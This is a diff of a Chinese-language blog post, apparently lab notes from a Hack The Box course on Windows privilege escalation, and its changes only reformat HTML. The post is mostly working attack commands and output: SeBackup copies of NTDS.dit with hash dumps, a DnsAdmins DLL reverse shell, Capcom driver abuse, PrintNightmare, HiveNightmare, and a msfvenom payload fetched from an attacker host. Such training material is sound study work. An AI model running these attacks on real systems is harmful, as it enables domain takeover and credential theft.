-<p><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects" target="_blank" rel="noreferrer">SeTakeOwnershipPrivilege</a> 赋予用户对任何“可保护对象”的所有权，即 Active Directory 对象、NTFS 文件/文件夹、打印机、注册表键、服务和进程。该权限赋予 <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights" target="_blank" rel="noreferrer">WRITE_OWNER</a> 对对象的权利，意味着用户可以在对象的安全描述符内更改所有者。管理员默认被赋予此权限。虽然很少遇到具有此权限的标准用户账户，但我们可能会遇到例如被赋予该权限的服务账户，负责运行备份作业和 VSS 快照。它还可能被赋予一些其他账户，如 <code>SeBackupPrivilege</code>、<code>SeRestorePrivilege</code> 和 <code>SeSecurityPrivilege</code>，以更细致地控制该账户的权限，而不赋予账户完整的本地管理员权限。这些特权本身很可能被用来升级特权。不过，有时我们可能需要对特定文件负责，因为其他方法被阻挡，或者其他方法无法如预期般工作。滥用这种特权有点特殊。不过，深入理解还是值得的，尤其是因为在 Active Directory 环境中，我们可能会遇到这样一种情景，可以将这项权利分配给特定用户，并利用它来读取文件共享上的敏感文件。</p>
+<p><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects" rel="noreferrer" target="_blank">SeTakeOwnershipPrivilege</a> 赋予用户对任何“可保护对象”的所有权，即 Active Directory 对象、NTFS 文件/文件夹、打印机、注册表键、服务和进程。该权限赋予 <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights" rel="noreferrer" target="_blank">WRITE_OWNER</a> 对对象的权利，意味着用户可以在对象的安全描述符内更改所有者。管理员默认被赋予此权限。虽然很少遇到具有此权限的标准用户账户，但我们可能会遇到例如被赋予该权限的服务账户，负责运行备份作业和 VSS 快照。它还可能被赋予一些其他账户，如 <code>SeBackupPrivilege</code>、<code>SeRestorePrivilege</code> 和 <code>SeSecurityPrivilege</code>，以更细致地控制该账户的权限，而不赋予账户完整的本地管理员权限。这些特权本身很可能被用来升级特权。不过，有时我们可能需要对特定文件负责，因为其他方法被阻挡，或者其他方法无法如预期般工作。滥用这种特权有点特殊。不过，深入理解还是值得的，尤其是因为在 Active Directory 环境中，我们可能会遇到这样一种情景，可以将这项权利分配给特定用户，并利用它来读取文件共享上的敏感文件。</p>
 <p><strong>WRITE_OWNER 权限</strong> 意思是：</p>
 <blockquote>你可以修改对象的 Owner 字段。</blockquote>
 <p>注意一个关键逻辑： <strong>Windows 有个隐藏规则：</strong> <strong>对象的所有者天然有权修改 DACL。</strong> 所以攻击链是：</p>
 <ol><li>你用 SeTakeOwnershipPrivilege 把文件“抢过来”</li><li>你成为 Owner</li><li>作为 Owner，你可以修改 ACL</li><li>给自己 Full Control</li><li>然后随便读写</li></ol>
 <p>这就是它危险的地方。</p>
-<img src="assets/posts/windows-privilege-escalation/Pasted image 20260228044423.png" alt="Pasted image 20260228044423" />
+<img alt="Pasted image 20260228044423" src="assets/posts/windows-privilege-escalation/Pasted image 20260228044423.png"/>
 <p>该设置可以在组策略中设置：</p>
 <p><code>计算机配置</code> ⇾ <code>Windows 设置</code> ⇾ <code>安全设置</code> ⇾ <code>本地策略</code> ⇾ <code>用户权限分配</code></p>
 <ul><li><code>Computer Configuration</code> ⇾ <code>Windows Settings</code> ⇾ <code>Security Settings</code> ⇾ <code>Local Policies</code> ⇾ <code>User Rights Assignment</code></li></ul>
-<img src="assets/posts/windows-privilege-escalation/Pasted image 20260228044443.png" alt="Pasted image 20260228044443" />
+<img alt="Pasted image 20260228044443" src="assets/posts/windows-privilege-escalation/Pasted image 20260228044443.png"/>
 <p>有了此权限，用户可以拥有任何文件或对象的所有权，并进行涉及敏感数据访问、 <code>远程代码执行</code> （<code>RCE</code>）或<code>拒绝服务</code> （DOS）的更改。</p>
-<p>假设我们遇到拥有此权限的用户，或通过使用 <a href="https://github.com/FSecureLABS/SharpGPOAbuse" target="_blank" rel="noreferrer">SharpGPOAbuse</a> 等攻击（如 GPO 滥用）赋予该权限。在这种情况下，我们可以利用这个权限来控制共享文件夹或敏感文件，比如包含密码的文档或 SSH 密钥。</p>
+<p>假设我们遇到拥有此权限的用户，或通过使用 <a href="https://github.com/FSecureLABS/SharpGPOAbuse" rel="noreferrer" target="_blank">SharpGPOAbuse</a> 等攻击（如 GPO 滥用）赋予该权限。在这种情况下，我们可以利用这个权限来控制共享文件夹或敏感文件，比如包含密码的文档或 SSH 密钥。</p>
 <p><strong>利用权限, Leveraging the Privilege</strong></p>
 <ol><li>审查当前用户权限</li></ol>
 <pre><code class="language-PowerShell-session">PS C:\htb&gt; whoami /priv
@@ -6748,7 +6756,7 @@ C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive</code>
                1 File(s)             36 bytes
                2 Dir(s)  17,079,754,752 bytes free</code></pre>
 <p>我们可以看到 IT 共享似乎属于一个服务账户，并且确实包含一个文件 <code>cred.txt</code> 里面有一些数据。</p>
-<p>现在我们可以用 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown" target="_blank" rel="noreferrer">Takeown</a> Windows 二进制文件来更改文件的所有权。</p>
+<p>现在我们可以用 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown" rel="noreferrer" target="_blank">Takeown</a> Windows 二进制文件来更改文件的所有权。</p>
 <ol><li>接管文件的所有权</li></ol>
 <pre><code class="language-PowerShell-session">PS C:\htb&gt; takeown /f 'C:\Department Shares\Private\IT\cred.txt'
  
@@ -6800,9 +6808,9 @@ root:n1X_p0wer_us3er!</code></pre>
 <p>账户可以分配给这些组，以强制执行最小权限，避免为执行特定任务（如备份）而创建更多域管理员和企业管理员。有时供应商应用还会要求某些权限，可以通过将服务账户分配给这些组之一来获得。账户也可能因意外添加，或在测试特定工具或脚本后遗留。我们应始终检查这些小组，并在报告中附录每个小组成员名单，供客户审核并判断是否仍需访问。</p>
 <div class="post-table-wrap"><table><thead><tr><th>备用</th><th>事件日志阅读器</th><th>管理员</th></tr></thead><tbody><tr><td>管理员</td><td>打印</td><td>服务器运营者</td></tr></tbody></table></div>
 <h3>Backup Operators 备份操作员</h3>
-<p>在登录到目标机器后，我们可以使用命令 <code>whoami /groups</code> 显示当前的组成员。加入该组成员可获得 <code>SeBackup</code> 和 <code>SeRestore</code> 的特权。<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges" target="_blank" rel="noreferrer">SeBackupPrivilege</a> 允许我们遍历任何文件夹并列出文件夹内容。这样即使文件夹的访问控制列表（ACL）中没有访问控制条目（ACE），也能让我们从文件夹复制文件。然而，我们无法使用标准的复制命令来实现这一点。相反，我们需要程序化地复制数据，并确保指定 <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea" target="_blank" rel="noreferrer">FILE_FLAG_BACKUP_SEMANTICS</a> 标志。</p>
+<p>在登录到目标机器后，我们可以使用命令 <code>whoami /groups</code> 显示当前的组成员。加入该组成员可获得 <code>SeBackup</code> 和 <code>SeRestore</code> 的特权。<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges" rel="noreferrer" target="_blank">SeBackupPrivilege</a> 允许我们遍历任何文件夹并列出文件夹内容。这样即使文件夹的访问控制列表（ACL）中没有访问控制条目（ACE），也能让我们从文件夹复制文件。然而，我们无法使用标准的复制命令来实现这一点。相反，我们需要程序化地复制数据，并确保指定 <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea" rel="noreferrer" target="_blank">FILE_FLAG_BACKUP_SEMANTICS</a> 标志。</p>
 <p><strong>如何在未获得必要权限的情况下访问敏感信息。</strong></p>
-<p>我们可以利用这个 <a href="https://github.com/giuliano108/SeBackupPrivilege" target="_blank" rel="noreferrer">PoC</a> 来利用 <code>SeBackupPrivilege</code>，复制这个文件。首先，让我们在 PowerShell 会话中导入库。</p>
+<p>我们可以利用这个 <a href="https://github.com/giuliano108/SeBackupPrivilege" rel="noreferrer" target="_blank">PoC</a> 来利用 <code>SeBackupPrivilege</code>，复制这个文件。首先，让我们在 PowerShell 会话中导入库。</p>
 <ol><li>Importing Libraries</li></ol>
 <pre><code class="language-PowerShell-session">PS C:\htb&gt; Import-Module .\SeBackupPrivilegeUtils.dll
 PS C:\htb&gt; Import-Module .\SeBackupPrivilegeCmdLets.dll</code></pre>
@@ -6877,7 +6885,7 @@ Board of Directors:
 
 &lt;...SNIP...&gt;</code></pre>
 <p><strong>攻击DC - Copying NTDS.dit</strong> 该组还允许本地登录域控制器。活动目录数据库 <code>NTDS.dit</code> 是一个非常有吸引力的目标，因为它包含了该域内所有用户和计算机对象的 NTLM 哈希值。然而，该文件被锁定，且非特权用户无法访问。</p>
-<p>由于 <code>NTDS.dit</code> 文件默认被锁定，我们可以使用 Windows 的 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow" target="_blank" rel="noreferrer">diskshadow</a> 工具创建 <code>C</code> 盘的影子副本，并将其暴露为 <code>E</code> 盘。这个影子副本中的 NTDS.dit 不会被系统使用。</p>
+<p>由于 <code>NTDS.dit</code> 文件默认被锁定，我们可以使用 Windows 的 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow" rel="noreferrer" target="_blank">diskshadow</a> 工具创建 <code>C</code> 盘的影子副本，并将其暴露为 <code>E</code> 盘。这个影子副本中的 NTDS.dit 不会被系统使用。</p>
 <pre><code class="language-PowerShell-session">PS C:\htb&gt; diskshadow.exe
 
 Microsoft DiskShadow version 1.0
@@ -7014,7 +7022,7 @@ hyperv_adm:1106:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c5
 printsvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
 
 &lt;SNIP&gt;</code></pre>
-<p><strong>Robocopy</strong> 用 Robocopy 复制文件 内置的工具 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy" target="_blank" rel="noreferrer">robocopy</a> 也可以用来备份文件。Robocopy 是一种命令行目录复制工具。它可以用于创建备份作业，并包含多线程复制、自动重试、恢复复制等功能。Robocopy 与<code>复制</code>命令的不同之处在于，它不仅能复制所有文件，还能检查目标目录并删除不再在源目录中的文件。它还能在复制前比较文件，节省时间，避免复制自上次复制/备份工作后未更改的文件。</p>
+<p><strong>Robocopy</strong> 用 Robocopy 复制文件 内置的工具 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy" rel="noreferrer" target="_blank">robocopy</a> 也可以用来备份文件。Robocopy 是一种命令行目录复制工具。它可以用于创建备份作业，并包含多线程复制、自动重试、恢复复制等功能。Robocopy 与<code>复制</code>命令的不同之处在于，它不仅能复制所有文件，还能检查目标目录并删除不再在源目录中的文件。它还能在复制前比较文件，节省时间，避免复制自上次复制/备份工作后未更改的文件。</p>
 <pre><code class="language-cmd-session">C:\htb&gt; robocopy /B E:\Windows\NTDS .\ntds ntds.dit
 
 -------------------------------------------------------------------------------
@@ -7069,7 +7077,7 @@ Members
 logger
 The command completed successfully.</code></pre>
 <p>发布了涵盖所有内置 Windows 命令的参考指南 ，包括语法、参数和示例。许多 Windows 命令支持以密码作为参数传递，如果启用了对进程命令行的审计，这些敏感信息将被捕获。</p>
-<p>我们可以用 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil" target="_blank" rel="noreferrer">wevtutil</a> 工具和 <a href="https://docs.microsoft.com/en-us/PowerShell/module/microsoft.PowerShell.diagnostics/get-winevent?view=PowerShell-7.1" target="_blank" rel="noreferrer">Get-WinEvent</a> PowerShell 命令符从命令行查询 Windows 事件。</p>
+<p>我们可以用 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil" rel="noreferrer" target="_blank">wevtutil</a> 工具和 <a href="https://docs.microsoft.com/en-us/PowerShell/module/microsoft.PowerShell.diagnostics/get-winevent?view=PowerShell-7.1" rel="noreferrer" target="_blank">Get-WinEvent</a> PowerShell 命令符从命令行查询 Windows 事件。</p>
 <p><strong>使用 wevtutil 搜索安全日志</strong></p>
 <pre><code class="language-PowerShell-session">PS C:\htb&gt; wevtutil qe Security /rd:true /f:text | Select-String "/user"
 
@@ -7087,13 +7095,13 @@ CommandLine
 net use T: \\fs01\backups /user:tim MyStr0ngP@ssword</code></pre>
 <p>该 cmdlet 也可以作为另一个用户使用 <code>-Credential</code> 参数运行。 其他日志包括 PowerShell 作日志，如果启用脚本块或模块日志，可能还包含敏感信息或凭证。该日志对无权限用户开放。</p>
 <h3>DnsAdmins DNS 管理员</h3>
-<p><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins" target="_blank" rel="noreferrer">DnsAdmins</a> 组的成员可以访问网络上的 DNS 信息。Windows DNS 服务支持自定义插件，并能调用插件中的函数来解决不在任何本地托管 DNS 区域范围内的名称查询。DNS 服务以 <code>NT AUTHORITY\SYSTEM</code> 形式运行，因此该组成员身份可能被用来提升域控制器的权限，或在有独立服务器作为该域的 DNS 服务器时升级。可以使用内置的 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd" target="_blank" rel="noreferrer">dnscmd</a> 工具来指定插件 DLL 的路径。正如这篇优秀文章中详细说明的，当域名控制器上运行 DNS 时（非常常见）可以实施以下攻击：</p>
+<p><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins" rel="noreferrer" target="_blank">DnsAdmins</a> 组的成员可以访问网络上的 DNS 信息。Windows DNS 服务支持自定义插件，并能调用插件中的函数来解决不在任何本地托管 DNS 区域范围内的名称查询。DNS 服务以 <code>NT AUTHORITY\SYSTEM</code> 形式运行，因此该组成员身份可能被用来提升域控制器的权限，或在有独立服务器作为该域的 DNS 服务器时升级。可以使用内置的 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd" rel="noreferrer" target="_blank">dnscmd</a> 工具来指定插件 DLL 的路径。正如这篇优秀文章中详细说明的，当域名控制器上运行 DNS 时（非常常见）可以实施以下攻击：</p>
 <p>管理通过 RPC 进行</p>
-<p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723" target="_blank" rel="noreferrer">ServerLevelPluginDll</a> 允许我们加载自定义 DLL，且无需对 DLL 路径进行任何验证。这可以通过命令行中的 <code>dnscmd</code> 工具完成</p>
+<p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723" rel="noreferrer" target="_blank">ServerLevelPluginDll</a> 允许我们加载自定义 DLL，且无需对 DLL 路径进行任何验证。这可以通过命令行中的 <code>dnscmd</code> 工具完成</p>
 <p>当 <code>DnsAdmins</code> 组的成员执行下面的 <code>dnscmd</code> 命令时，注册 <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll</code> 表密钥会被填充</p>
 <p>当 DNS 服务重启时，该路径中的 DLL 会被加载（即域控制器机器账户可以访问的网络共享）</p>
 <p>攻击者可以加载自定义 DLL 以获取反向 shell，甚至加载如 Mimikatz 等工具作为 DLL 来倾倒凭证。</p>
-<ul><li>DNS management is performed over RPC</li><li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723" target="_blank" rel="noreferrer">ServerLevelPluginDll</a> allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the <code>dnscmd</code> tool from the command line</li><li>When a member of the <code>DnsAdmins</code> group runs the <code>dnscmd</code> command below, the <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll</code> registry key is populated</li><li>When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)</li><li>An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.</li></ul>
+<ul><li>DNS management is performed over RPC</li><li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723" rel="noreferrer" target="_blank">ServerLevelPluginDll</a> allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the <code>dnscmd</code> tool from the command line</li><li>When a member of the <code>DnsAdmins</code> group runs the <code>dnscmd</code> command below, the <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll</code> registry key is populated</li><li>When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)</li><li>An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.</li></ul>
 <p><strong>利用 DnsAdmins 访问权限, Leveraging DnsAdmins Access</strong></p>
 <p>我们可以生成一个恶意 DLL，使用 <code>msfvenom</code> 将用户添加到<code>domain admins</code>群中。</p>
 <ol><li>生成恶意 DLL</li></ol>
@@ -7119,14 +7127,14 @@ Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
 <ol><li>加载 dll 文件：</li></ol>
 <pre><code>dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\reverseshell.dll</code></pre>
 <p>Press enter or click to view image in full size</p>
-<img src="https://miro.medium.com/v2/resize:fit:1050/1*SlaFH6tJgHJ8x4WtofXHwQ.png" alt="Referenced image" />
+<img alt="Referenced image" src="https://miro.medium.com/v2/resize:fit:1050/1*SlaFH6tJgHJ8x4WtofXHwQ.png"/>
 <ol><li>在 cmd 中停止和开始 DNS：</li></ol>
 <pre><code class="language-cmd">sc stop dns
 sc start dns</code></pre>
-<img src="https://miro.medium.com/v2/resize:fit:971/1*xZ847WY3IpPi1az0fgofwA.png" alt="Referenced image" />
+<img alt="Referenced image" src="https://miro.medium.com/v2/resize:fit:971/1*xZ847WY3IpPi1az0fgofwA.png"/>
 <p>然后我们得到一个反向壳同时：</p>
 <p>Press enter or click to view image in full size</p>
-<img src="https://miro.medium.com/v2/resize:fit:1050/1*oWFADwnorLf_xkRH5N1OVw.png" alt="Referenced image" />
+<img alt="Referenced image" src="https://miro.medium.com/v2/resize:fit:1050/1*oWFADwnorLf_xkRH5N1OVw.png"/>
 <p>now you can get the flag on:</p>
 <pre><code class="language-cmd">c:\Users\Administrator\Desktop\DnsAdmins\flag.txt</code></pre>
 <h3>Print Operators 打印操作员</h3>
@@ -7187,7 +7195,7 @@ C:\htb&gt; reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 
 
 The operation completed successfully.</code></pre>
 <p><code>\??\</code>用于引用恶意驱动程序映像路径的特殊语法是一种NT 对象路径。Win32 API 将解析并解析此路径，以便正确定位并加载我们的恶意驱动程序。</p>
-<p><strong>确认驱动程序未加载</strong> 使用 Nirsoft 的<a href="http://www.nirsoft.net/utils/driverview.html" target="_blank" rel="noreferrer">DriverView.exe</a>，我们可以验证 Capcom.sys 驱动程序未加载。</p>
+<p><strong>确认驱动程序未加载</strong> 使用 Nirsoft 的<a href="http://www.nirsoft.net/utils/driverview.html" rel="noreferrer" target="_blank">DriverView.exe</a>，我们可以验证 Capcom.sys 驱动程序未加载。</p>
 <pre><code class="language-PowerShell-session">PS C:\htb&gt; .\DriverView.exe /stext drivers.txt
 PS C:\htb&gt; cat drivers.txt | Select-String -pattern Capcom</code></pre>
 <p><strong>验证权限是否已启用</strong> 运行该<code>EnableSeLoadDriverPrivilege.exe</code>二进制文件。</p>
@@ -7219,7 +7227,7 @@ Filename              : C:\Tools\Capcom.sys</code></pre>
 [+] Token stealing was successful
 [+] The SYSTEM shell was launched</code></pre>
 <p>这将启动一个具有 SYSTEM 权限的 shell。</p>
-<img src="assets/posts/windows-privilege-escalation/Pasted image 20260228081647.png" alt="Pasted image 20260228081647" />
+<img alt="Pasted image 20260228081647" src="assets/posts/windows-privilege-escalation/Pasted image 20260228081647.png"/>
 <p><strong>替换方法 - 无图形用户界面</strong> 如果我们无法通过图形用户界面访问目标系统，则必须<code>ExploitCapcom.cpp</code>在编译前修改代码。在这里，我们可以编辑第 292 行，并将其替换为例如<code>"C:\\Windows\\system32\\cmd.exe"</code>使用 <code>reverse shell binary</code> 创建的反向 shell 二进制文件。<code>msfvenom</code><code>c:\ProgramData\revshell.exe</code></p>
 <pre><code class="language-c">// Launches a command shell process
 static bool LaunchShell()
@@ -7273,7 +7281,7 @@ SERVICE_NAME: AppReadiness
         DISPLAY_NAME       : App Readiness
         DEPENDENCIES       :
         SERVICE_START_NAME : LocalSystem</code></pre>
-<p>我们可以使用服务查看器/控制器 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psservice" target="_blank" rel="noreferrer">PsService</a>，它是系统内部套件的一部分，来检查服务权限。<code>PsService</code> 的工作原理类似于 <code>sc</code> 工具，可以显示服务状态和配置，还允许你在本地和远程主机上启动、停止、暂停、恢复和重启服务。</p>
+<p>我们可以使用服务查看器/控制器 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psservice" rel="noreferrer" target="_blank">PsService</a>，它是系统内部套件的一部分，来检查服务权限。<code>PsService</code> 的工作原理类似于 <code>sc</code> 工具，可以显示服务状态和配置，还允许你在本地和远程主机上启动、停止、暂停、恢复和重启服务。</p>
 <ol><li>使用 PsService 检查服务权限</li></ol>
 <pre><code class="language-cmd-session">C:\htb&gt; c:\Tools\PsService.exe security AppReadiness
 
@@ -7313,7 +7321,7 @@ DISPLAY_NAME: App Readiness
                 Read Permissions
         [ALLOW] BUILTIN\Server Operators
                 All</code></pre>
-<p>这证实了服务器运营商组拥有 <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights" target="_blank" rel="noreferrer">SERVICE_ALL_ACCESS</a> 访问权限，从而让我们对该服务拥有完全的控制权。</p>
+<p>这证实了服务器运营商组拥有 <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights" rel="noreferrer" target="_blank">SERVICE_ALL_ACCESS</a> 访问权限，从而让我们对该服务拥有完全的控制权。</p>
 <p>让我们看看本地管理员组当前的成员，确认我们的目标账户是否存在。</p>
 <ol><li>检查本地管理员组成员</li></ol>
 <pre><code class="language-cmd-session">C:\htb&gt; net localgroup Administrators
@@ -7403,7 +7411,7 @@ Administrator:des-cbc-md5:d60dfbbf20548938
 <p><strong>⑤ 启动服务</strong></p>
 <pre><code>sc start SecurityService</code></pre>
 <p>作用： 服务以 <strong>SYSTEM 权限</strong>运行，从而执行恶意程序并获取高权限。</p>
-<hr />
+<hr/>
 <ol><li>Weak Service Permissions（弱服务权限）</li></ol>
 <p><strong>概念</strong>: 如果普通用户对某个 Windows 服务拥有 <strong>SERVICE_ALL_ACCESS 权限</strong>，攻击者就可以修改服务配置（例如 <code>binpath</code>），让服务在启动时执行攻击者指定的命令，从而获得管理员权限。</p>
 <p><strong>利用步骤</strong></p>
@@ -7429,7 +7437,7 @@ Administrator:des-cbc-md5:d60dfbbf20548938
 <pre><code class="language-cmd">C:\Program.exe</code></pre>
 <p><strong>④ 等待服务启动</strong>：可以通过服务重启或系统重启触发。</p>
 <p>作用： Windows 会优先执行攻击者放置的恶意程序，从而以 <strong>SYSTEM 权限执行代码</strong>。</p>
-<hr />
+<hr/>
 <ol><li>Permissive Registry ACLs（可写服务注册表）</li></ol>
 <p><strong>概念</strong>: 如果普通用户对服务相关的 <strong>注册表键拥有写权限</strong>，攻击者可以修改服务的 <code>ImagePath</code>，让服务在启动时执行恶意程序。</p>
 <p><strong>利用步骤</strong></p>
@@ -7440,7 +7448,7 @@ Administrator:des-cbc-md5:d60dfbbf20548938
 <p><strong>③ 启动服务</strong></p>
 <pre><code class="language-cmd">sc start ModelManagerService</code></pre>
 <p>作用： 服务启动时会执行新的 <code>ImagePath</code>，从而以 <strong>SYSTEM 权限运行攻击代码</strong>。</p>
-<hr />
+<hr/>
 <ol><li>Modifiable Registry Autorun Binary（可修改启动项程序）</li></ol>
 <p><strong>概念</strong>: Windows 在系统启动或用户登录时会自动执行某些程序，如果攻击者可以修改这些启动项对应的程序或路径，就可以在用户登录时执行恶意代码实现提权。</p>
 <p><strong>利用步骤</strong></p>
@@ -7465,23 +7473,23 @@ Administrator:des-cbc-md5:d60dfbbf20548938
 <p>在目标机 PowerShell：</p>
 <pre><code>ls \\localhost\pipe\spoolss</code></pre>
 <p>如果看到 <code>spoolss</code>，说明打印服务在跑，可以继续。</p>
-<hr />
+<hr/>
 <h4>绕过执行策略</h4>
 <pre><code class="language-PowerShell">Set-ExecutionPolicy Bypass -Scope Process</code></pre>
 <p>输入 <code>A</code> 确认。</p>
-<hr />
+<hr/>
 <h4>导入脚本并添加管理员用户</h4>
 <p>假设题目环境里已经给了 <code>CVE-2021-1675.ps1</code>，执行：</p>
 <pre><code class="language-PowerShell">Import-Module C:\Tools\CVE-2021-1675.ps1 Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"</code></pre>
 <p>成功时一般会看到类似：</p>
 <ul><li>created payload</li></ul>
 <ul><li>added user hacker as local administrator</li></ul>
-<hr />
+<hr/>
 <h4>验证新用户</h4>
 <pre><code class="language-cmd">net user hacker</code></pre>
 <p>或者：</p>
 <pre><code class="language-cmd">net localgroup administrators</code></pre>
-<hr />
+<hr/>
 <h4>使用新用户获取管理员 Shell</h4>
 <p>如果 RDP 允许，直接重新登录：</p>
 <ul><li>用户：<code>hacker</code></li></ul>
@@ -7489,26 +7497,26 @@ Administrator:des-cbc-md5:d60dfbbf20548938
 <p>或者在当前会话里尝试：</p>
 <pre><code class="language-cmd">runas /user:hacker cmd</code></pre>
 <p>然后输入密码。</p>
-<hr />
+<hr/>
 <h4>再提升到高完整性 Shell</h4>
 <p>如果只是管理员组但还是中完整性，执行：</p>
 <pre><code class="language-PowerShell">Start-Process cmd -Verb RunAs</code></pre>
 <p>弹 UAC 就点是。</p>
-<hr />
+<hr/>
 <h4>读取 flag</h4>
 <pre><code class="language-cmd">type C:\Users\Administrator\Desktop\flag.txt</code></pre>
 <p>如果文件名不是这个，先：</p>
 <pre><code class="language-cmd">dir C:\Users\Administrator\Desktop</code></pre>
-<hr />
+<hr/>
 <h3>二、HiveNightmare / SeriousSam</h3>
 <p>这个示例的本质是： <strong>低权限读取注册表影子副本 -&gt; 导出 hive -&gt; 离线提 hash</strong>。</p>
-<hr />
+<hr/>
 <h4>检查 SAM 文件权限</h4>
 <pre><code class="language-cmd">icacls C:\Windows\System32\config\SAM</code></pre>
 <p>你要看有没有类似：</p>
 <pre><code>BUILTIN\Users:(I)(RX)</code></pre>
 <p>如果有，说明有戏。</p>
-<hr />
+<hr/>
 <h4>运行 HiveNightmare</h4>
 <p>假设工具已经在桌面或工具目录：</p>
 <pre><code class="language-cmd">.\HiveNightmare.exe</code></pre>
@@ -7516,11 +7524,11 @@ Administrator:des-cbc-md5:d60dfbbf20548938
 <ul><li><code>SAM-xxxx-xx-xx</code></li></ul>
 <ul><li><code>SYSTEM-xxxx-xx-xx</code></li></ul>
 <ul><li><code>SECURITY-xxxx-xx-xx</code></li></ul>
-<hr />
+<hr/>
 <h4>把文件传回攻击机</h4>
 <p>在攻击机开 HTTP 或 SMB 收，或者直接 RDP 拖出来。 如果你在 Kali 上，用 impacket 解析：</p>
 <pre><code class="language-shell">impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local</code></pre>
-<hr />
+<hr/>
 <h4>拿到哈希后怎么用</h4>
 <p>如果看到管理员或其他高权限账户哈希，可以尝试：</p>
 <ul><li>本地 PTH（某些场景）</li></ul>
@@ -7529,32 +7537,32 @@ Administrator:des-cbc-md5:d60dfbbf20548938
 <p>但这一步在这题里不一定是最顺的路线。 所以这部分你更该把它当作：</p>
 <p><strong>“验证这个漏洞能被利用”</strong>。</p>
 <p>如果题目硬要求 “try out 3 examples”，你跑通导出 hive 并拿到 hash，基本就算完成这个示例了。</p>
-<hr />
+<hr/>
 <h3>三、CVE-2020-0668 与 Mozilla Maintenance Service 提权链</h3>
 <p>这个是本节里最像“标准 SYSTEM 提权”的链子。</p>
 <h4>先确认当前权限不高</h4>
 <pre><code class="language-cmd">whoami /priv</code></pre>
 <p>一般会看到你只是普通用户权限。</p>
-<hr />
+<hr/>
 <h4>检查 Mozilla Maintenance Service 二进制文件权限</h4>
 <pre><code class="language-cmd">icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"</code></pre>
 <p>正常一开始你应该只有：</p>
 <pre><code>BUILTIN\Users:(I)(RX)</code></pre>
 <p>也就是只能读执行，不能写。</p>
-<hr />
+<hr/>
 <h4>在攻击机生成恶意 EXE</h4>
 <p>如果你用 msfvenom：</p>
 <pre><code class="language-shell">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=&lt;你的VPN_IP&gt; LPORT=8443 -f exe &gt; maintenanceservice.exe</code></pre>
-<hr />
+<hr/>
 <h4>在攻击机开启 HTTP 服务</h4>
 <pre><code class="language-shell">python3 -m http.server 8080</code></pre>
-<hr />
+<hr/>
 <h4>在目标机下载两份恶意 EXE</h4>
 <p>PowerShell：</p>
 <pre><code class="language-PowerShell">wget http://&lt;你的VPN_IP&gt;:8080/maintenanceservice.exe -O C:\Users\htb-student\Desktop\maintenanceservice.exe
 wget http://&lt;你的VPN_IP&gt;:8080/maintenanceservice.exe -O C:\Users\htb-student\Desktop\maintenanceservice2.exe</code></pre>
 <p>为什么两份？ 因为第一份在漏洞利用过程中会被“搞坏”，第二份是备用的干净版本。</p>
-<hr />
+<hr/>
 <h4>运行 CVE-2020-0668</h4>
